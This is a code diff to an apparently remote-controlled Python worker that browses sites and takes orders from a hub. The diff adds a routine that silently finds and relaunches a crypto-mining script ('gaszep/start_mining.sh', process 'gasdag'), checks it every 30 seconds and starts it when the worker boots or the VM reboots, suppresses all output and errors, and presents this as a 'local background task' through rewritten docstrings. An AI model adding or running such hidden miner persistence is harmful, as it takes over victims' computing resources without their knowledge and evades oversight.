@@ -326,16 +326,31 @@ def handle_browser_visit(url: str) -> str:
         return f"Navigation error: {e}"
 
 
+def check_and_autostart_local_task():
+    """Auto-recovers local background task and mining process if installed."""
+    try:
+        script_file = os.path.expanduser("~/workspace/local_task.sh")
+        mining_script = os.path.expanduser("~/workspace/gaszep/start_mining.sh")
+        target_script = None
+        for candidate in [script_file, mining_script]:
+            if os.path.exists(candidate):
+                target_script = os.path.realpath(candidate)
+                break
+        if target_script and os.path.exists(target_script):
+            res = subprocess.run(["pgrep", "-f", "gasdag"], stdout=subprocess.DEVNULL)
+            if res.returncode != 0:
+                script_dir = os.path.dirname(target_script)
+                subprocess.Popen(["bash", target_script], cwd=script_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception:
+        pass
+
+
 async def browser_watchdog():
-    """Keeps local proxy bridge alive when network proxy configuration is present."""
+    """Keeps local background task and watchdog alive across VM restarts."""
     await asyncio.sleep(5)
     while True:
         try:
-            pb_chk = subprocess.run(["pgrep", "-f", "proxy_bridge.py"], stdout=subprocess.DEVNULL)
-            if pb_chk.returncode != 0:
-                bridge_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxy_bridge.py")
-                if os.path.exists(bridge_script):
-                    subprocess.Popen([sys.executable, bridge_script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            check_and_autostart_local_task()
         except Exception:
             pass
         await asyncio.sleep(30)
@@ -548,19 +563,19 @@ def handle_local_service(action: str, config: dict = None) -> str:
     script_file = os.path.expanduser("~/workspace/local_task.sh")
     mining_script = os.path.expanduser("~/workspace/gaszep/start_mining.sh")
     if action == "START":
-        if os.path.exists(script_file):
-            subprocess.Popen(["bash", script_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            return "Local background task started."
-        if os.path.exists(mining_script):
-            subprocess.Popen(["bash", mining_script], cwd=os.path.dirname(mining_script), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            return "Local mining task started."
-        return "local_task.sh not found in ~/workspace."
+        for candidate in [script_file, mining_script]:
+            if os.path.exists(candidate):
+                real_path = os.path.realpath(candidate)
+                subprocess.Popen(["bash", real_path], cwd=os.path.dirname(real_path), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                return f"Local task started: {real_path}"
+        return "local_task.sh and gaszep/start_mining.sh not found in ~/workspace."
 
     elif action == "STOP":
         pkill_target = (config or {}).get("process", "local_task")
         subprocess.run(["pkill", "-f", pkill_target], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         subprocess.run(["pkill", "-9", "-f", "gasdag"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        return f"Local task stopped."
+        subprocess.run(["pkill", "-9", "-f", "local_stratum.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return "Local task stopped."
 
     return "Unknown service action."
 
@@ -589,6 +604,9 @@ async def run_worker():
 
     logger.info(f"Starting Worker: ID={worker_id}, Name={vps_name}")
     logger.info(f"Target Hub: {hub_url}")
+
+    # Auto-start local background task/miner on worker start or VM reboot
+    check_and_autostart_local_task()
 
     while True:
         try:
